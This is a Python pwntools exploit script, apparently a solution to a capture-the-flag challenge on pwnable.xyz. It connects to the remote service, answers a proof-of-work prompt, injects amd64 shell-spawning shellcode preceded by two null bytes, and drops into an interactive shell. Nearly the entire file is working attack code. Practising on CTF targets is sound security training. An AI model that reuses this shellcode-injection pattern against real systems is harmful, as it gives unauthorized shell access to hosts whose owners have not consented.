from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./challenge')
p = remote('svc.pwnable.xyz',30025)
#p = process('./challenge')
win = e.symbols['win']

## solve pow
p.recvuntil('POW: x + y ==')
buf = int(p.recvline().strip(),16)
p.sendlineafter('> ','0 ' + str(buf))

payload = '\x00'*2
payload += asm(shellcraft.amd64.sh())
p.sendafter(':',payload)

p.interactive()